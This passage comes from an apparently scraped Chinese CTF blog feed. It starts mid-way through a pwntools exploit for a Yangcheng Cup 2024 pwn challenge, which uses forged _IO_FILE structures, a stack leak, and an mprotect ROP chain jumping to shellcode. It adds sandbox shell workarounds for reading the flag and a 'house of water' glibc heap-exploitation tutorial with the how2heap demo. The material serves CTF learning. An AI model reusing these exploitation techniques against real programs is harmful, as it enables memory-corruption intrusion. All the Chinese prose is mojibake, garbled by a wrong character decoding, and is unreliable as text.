class="number">0</span>,fake_io_read[<span class="number">0x10</span>:])</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">target = stack - <span class="number">720</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000166262</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x0000000000099a83</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000023a60</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x7b0</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rdi_ret, heap_base,</span><br><span class="line">    pop_rsi_ret, <span class="number">0x2000</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">7</span>,</span><br><span class="line">    mprotect, </span><br><span class="line">    pop_rbp_ret, heap_base + <span class="number">0x3000</span>,</span><br><span class="line">    pop_rax_call_rax, shellcode_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå³å¯ç¨³å®šæ‹¿ <code>shell</code>ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯æ˜¯è¿™ä¸ª <code>shell</code> å¹¶ä¸èƒ½ä½¿ç”¨ <code>lsã€cat</code> è¿™äº›æŒ‡ä»¤ï¼Œåªèƒ½ä½¿ç”¨ <code>cdã€pwdã€echo</code> è¿™ç§æ¯”è¾ƒåŸºæœ¬çš„ï¼Œè€Œä¸” <code>echo</code> çš„åŠŸèƒ½è¿˜ä¸å…¨ï¼Œä¸‹é¢ç»™å‡ºä¸€äº›å¯ä»¥ç”¨æ¥å¹³æ›¿çš„è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>é‚£ä¸ºä»€ä¹ˆ <code>lsã€cat</code> ç­‰æŒ‡ä»¤æ— æ³•ä½¿ç”¨å‘¢ï¼Ÿè¿™é‡Œä»¥ <code>ls</code> ä¸ºä¾‹è§£é‡Šä¸€ä¸‹ï¼š<br>lså‘½ä»¤çš„å®ç°å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š  </p><ol><li><p>æ‰“å¼€ç›®å½•ï¼šé¦–å…ˆï¼Œéœ€è¦æ‰“å¼€è¦åˆ—å‡ºæ–‡ä»¶çš„ç›®å½•ã€‚å¯ä»¥ä½¿ç”¨ <code>open()</code> ç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€ç›®å½•ï¼Œå¹¶è·å¾—ä¸€ä¸ªç›®å½•æ–‡ä»¶æè¿°ç¬¦ã€‚  </p></li><li><p>è¯»å–ç›®å½•é¡¹ï¼šé€šè¿‡ <code>readdir()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥ä»æ‰“å¼€çš„ç›®å½•ä¸­è¯»å–ç›®å½•é¡¹ã€‚<code>readdir()</code> ä¼šè¿”å›ä¸€ä¸ªæŒ‡å‘ç›®å½•é¡¹ç»“æ„ä½“çš„æŒ‡é’ˆã€‚é€šè¿‡å¾ªç¯è°ƒç”¨ <code>readdir()</code>ï¼Œå¯ä»¥é€ä¸ªè¯»å–ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚  </p></li><li><p>è¿‡æ»¤éšè—æ–‡ä»¶ï¼šåœ¨è¯»å–ç›®å½•é¡¹ä¹‹åï¼Œéœ€è¦å¯¹ç›®å½•é¡¹è¿›è¡Œè¿‡æ»¤ã€‚Linuxä¸­çš„éšè—æ–‡ä»¶ä»¥.å¼€å¤´ï¼Œå¯ä»¥é€šè¿‡åˆ¤æ–­ç›®å½•é¡¹çš„åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º.æ¥è¿‡æ»¤éšè—æ–‡ä»¶ã€‚  </p></li><li><p>è¾“å‡ºç›®å½•é¡¹ä¿¡æ¯ï¼šè¯»å–åˆ°ä¸€ä¸ªç›®å½•é¡¹ä¹‹åï¼Œå¯ä»¥é€šè¿‡ç›®å½•é¡¹ç»“æ„ä½“ä¸­çš„å­—æ®µè·å–æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶åã€å¤§å°ã€ä¿®æ”¹æ—¶é—´ç­‰ã€‚å¯ä»¥ä½¿ç”¨ <code>printf()</code> å‡½æ•°å°†è¿™äº›ä¿¡æ¯è¾“å‡ºåˆ°ç»ˆç«¯ã€‚  </p></li><li><p>å…³é—­ç›®å½•ï¼šä½¿ç”¨ <code>closedir()</code> ç³»ç»Ÿè°ƒç”¨æ¥å…³é—­æ‰“å¼€çš„ç›®å½•ï¼Œé‡Šæ”¾èµ„æºã€‚</p></li></ol><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œ <code>ls</code> å‘½ä»¤éœ€è¦ä½¿ç”¨ <code>open</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æ˜¯æˆ‘ä»¬æ‹¿åˆ°çš„ <code>shell</code> ä¾ç„¶å¤„äºæ²™ç®±çš„ç¯å¢ƒä¸­ï¼Œ<code>open</code> ç³»ç»Ÿè°ƒç”¨ç»™ç¦æ­¢ä½¿ç”¨ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬æ— æ³•ä½¿ç”¨ <code>ls</code> å‘½ä»¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
      <link href="/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"/>
      <url>/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h1><p>æ—©å°±å¬ Csome å­¦é•¿è¯´è¿‡æœ‰ç§æ‰“æ³•å« house of waterï¼Œä½†æ˜¯å½“æ—¶æ²¡å»çœ‹ï¼Œæ—¶é—´ä¹…äº†å°±å¿˜è®°è¿™ä¸ªä¸œè¥¿äº†ï¼Œç°åœ¨è®°èµ·æ¥äº†å°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ç”±äºç¬”è€…çš„æ°´å¹³æœ‰é™ï¼Œæ–‡ç« ä¸å…ä¼šå‡ºç°è®¸å¤šé”™è¯¯ï¼Œå¸Œæœ›å„ä½å¸ˆå‚…èƒ½è¿‡åŒ…å®¹ä»¥åŠæŒ‡æ­£ã€‚è¿™ç¯‡æ–‡ç« çš„ç¨‹åºçš„æµ‹è¯•ç¯å¢ƒä¸º ubuntu 22.04.3 TLSã€‚</p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>è¿™ä¸ªæ‰“æ³•ç”±å›½é™…æˆ˜é˜Ÿ blue water æå‡ºçš„ï¼Œä¸‹é¢æ¥çœ‹çœ‹è¯¥å›¢é˜Ÿå¯¹è¿™ä¸ªæ‰“æ³•çš„æè¿°ï¼š</p><blockquote><p>House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache<br>metadata control primitive, with the added benefit of obtaining a free libc pointer in the<br>t-cache metadata as well.</p><p>NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will<br>contain 4 bits of randomness. If you can increment integers, no brutefore is required.</p><p>By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a â€œfakeâ€ heap chunk header of<br>size â€œ0x10001â€ is created.</p><p>This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked<br>address entries, enabling the creation of a fully functional fake unsorted-bin entry.</p><p>The correct size should be set for the chunk, and the next chunkâ€™s prev-in-use bit<br>must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values<br>should be written.</p><p>Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control<br>is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer<br>to be ready for allocation as well.</p><p>Technique &#x2F; house by @udp_ctf - Water Paddler &#x2F; Blue Water </p></blockquote><p>ç›¸ä¿¡å¤§å¤šæ•°äººéƒ½æ²¡çœ‹æ‡‚ï¼ˆæ„Ÿè§‰æ˜¯æˆ‘ç†è§£åŠ›æœ‰å¾…æé«˜ğŸ˜­ï¼‰ï¼Œä¸è¿‡ä¸ç”¨ç€æ€¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šè¿›è¡Œæ¯”è¾ƒè¯¦ç»†çš„è®²è§£ã€‚<br>è¯¥æ‰“æ³•çš„åˆ©ç”¨å‰ç½®æ¡ä»¶å¦‚ä¸‹ï¼š</p><blockquote><p>ç¨‹åºå­˜åœ¨UAFæ¼æ´<br>ç¨‹åºå¯ä»¥ç”³è¯·ä½å¤Ÿå¤§çš„å †å—</p></blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®Œæˆè¯¥æ‰“æ³•ä¸éœ€è¦æ³„éœ²ä»»ä½•å†…å­˜åœ°å€ä¸”ä¸éœ€è¦ä»»ä½•å †ä¸Šçš„æº¢å‡º<br>æœ€ç»ˆçš„æ•ˆæœæ˜¯èƒ½å¤Ÿåœ¨ tcache çš„é“¾è¡¨ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œå¹¶å°†å…¶ç”³è¯·å‡ºæ¥ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å½“ç¨‹åºå¼€å§‹è¿è¡Œå¹¶é‡åˆ°å®ƒçš„ç¬¬ä¸€ä¸ª malloc æ—¶ï¼Œå †ï¼ˆmain arenaï¼‰å°†è¢«åˆå§‹åŒ–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ˆlibc 2.31+ï¼‰ï¼Œå°†åˆ†é… 0x290 çš„å†…å­˜å¤§å°æ¥å­˜å‚¨ tcache_perthread_struct ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å­˜å‚¨å„ä¸ªä¸åŒ size çš„ tcache é“¾è¡¨çš„ chunk çš„ä¸ªæ•°ä»¥åŠæœ€åè¿›å…¥é“¾è¡¨çš„ chunk çš„ data åŒºåŸŸåœ°å€ã€‚ è¯¥ç»“æ„ä½“çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­çš„ entries åŒºåŸŸç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ï¼Œè¿›è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿç”³è¯· libc ä¸Šçš„å†…å­˜</p><h2 id="Attack-Demo"><a href="#Attack-Demo" class="headerlink" title="Attack Demo"></a>Attack Demo</h2><p>è¿™é‡Œæˆ‘ä»¬é€‰ç”¨ how2heap ä¸­çš„ <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">house of water</a> è¿™ä¸ªä¾‹å­æ¥è§£é‡Šï¼Œè¿™é‡Œæˆ‘åšäº†ä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼ŒæŠŠä¸€äº›è‹±æ–‡æ®µè½è¿›è¡Œäº†åˆ é™¤ï¼Œåªç•™ä¸‹ç¨‹åºæ‰§è¡Œä»£ç </p><h3 id="house-of-water-c"><a href="#house-of-water-c" class="headerlink" title="house_of_water.c"></a>house_of_water.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 22.04.3 LTS</span></span><br><span class="line"><span class="comment">// gcc -g house_of_water.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line"><span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line"><span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line"><span class="built_in">free</span>(fake_size_msb);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);  <span class="comment">// Padding</span></span><br><span class="line"><span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start);</span><br><span class="line"></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line"><span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨ç¼–è¯‘é˜¶æ®µæˆ‘ä»¬ä½¿ç”¨äº†â€œ-gâ€å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨gdbåœ¨ä»»æ„è¡Œä¸‹æ–­ç‚¹<code>b + è¡Œå·</code><br>æ¥ä¸‹æ¥å¯¹è¿™æ®µ demo è¿›è¡Œè°ƒè¯•<br>å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 18 è¡Œï¼Œæ­¤æ—¶ç¨‹åºå®Œæˆçš„æ“ä½œå¦‚ä¸‹ï¼š<br>ç”³è¯·äº† 2 ä¸ªå †å—ï¼Œsize åˆ†åˆ«ä¸º 0x3e0 å’Œ 0x3f0ï¼Œç´§æ¥ç€å°†å…¶é‡Šæ”¾æ‰<br>æˆ‘ä»¬æ¥çœ‹çœ‹æ­¤æ—¶çš„ tcache_perthread_struct ç»“æ„ä½“ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªæ¡†æ¡†çš„åœ°æ–¹çš„åœ°å€å°±æ˜¯æˆ‘ä»¬åˆšæ‰é‡Šæ”¾çš„ 2 ä¸ªå †å—åœ°å€ï¼Œè€Œç¬¬ä¸€ä¸ªæ¡†æ¡†åˆ™æ˜¯ size ä¸º 0x3e0 å’Œ 0x3f0 å¯¹åº”çš„ tcache é“¾è¡¨ chunk çš„ä¸ªæ•°ï¼Œç„¶è€Œè¿™ä¸ª heapbase+0x88 è¿™ä¸ª 0x10001 å¯ä»¥ä½œä¸ºæˆ‘ä»¬fake chunk çš„sizeï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªåœ°æ–¹ä½œä¸º fake chunk å¹¶æ”¾å…¥ unsorted binï¼ˆåé¢ç§°è¿™ä¸ª chunk ä¸º fake unsorted chunkï¼‰ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ tcache_perthread_struct ç»“æ„ä½“ä¸Šè¸©ä¸Š libc çš„åœ°å€ã€‚<br>æ¥ä¸‹æ¥å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 0x38 è¡Œï¼Œè¿™æœŸé—´åšçš„éƒ½æ˜¯å †å—ç”³è¯·å·¥ä½œï¼š<br>è¿ç»­ç”³è¯·äº† 7 ä¸ª 0x90 å¤§å°çš„ chunkï¼Œç„¶åäº¤æ›¿ç”³è¯· 0x90 å’Œ 0x20 å¤§å°çš„ chunkã€‚æˆ‘ä»¬æœ€ç»ˆå¸Œæœ›æœ€åç”³è¯·çš„ 3 ä¸ª 0x90 å¤§å°çš„chunk å¯ä»¥è¿›å…¥ unsorted binï¼Œæ‰€ä»¥æ¯ 2 ä¸ª chunk ä¹‹é—´éƒ½ç”³è¯·ä¸€ä¸ªå°å †å—æ¥é˜²æ­¢ä»–ä»¬åˆå¹¶ã€‚è¿™é‡Œå°†è¦è¿›å…¥ unsorted bin çš„ä¸‰ä¸ª chunk åˆ†åˆ«å‘½åä¸ºï¼šunsorted_startã€unsorted_middleã€unsorted_endã€‚å¾ˆå¥½ç†è§£å§ï¼Œå¼€å§‹ã€ä¸­é—´ã€ç»“æŸğŸ˜‹<br>æœ€åè¿˜ç”³è¯·äº†ä¸€ä¸ªç‰¹åˆ«å¤§çš„ chunkï¼Œsize ä¸º 0xf0010ï¼Œåé¢ç´§æ¥ç€ä¸€ä¸ª size ä¸º 0x20 çš„å° chunk<br>æ¥ç€å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 41 è¡Œï¼Œè¿™é‡Œåœ¨æœ€åé‚£ä¸ª size ä¸º 0x20 çš„ chunk çš„ fd ä½ç½®å†™ä¸Š 0x1000ï¼Œåœ¨ bk ä½ç½®å†™ä¸Š 0x20ã€‚</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>è¿™æ ·åšæ˜¯ä¸ºäº†ç»•è¿‡ unsorted binçš„æ£€æµ‹ã€‚æˆ‘ä»¬å›åˆ°æœ€åˆçš„ fake unsorted chunk çš„ä½ç½®ï¼Œå…¶èµ·å§‹åœ°å€ä¸º0x555555559080</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ª chunk åœ¨ unsorted bin ä¸­åˆæ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨è®©è¿™æ · fake unsorted chunk 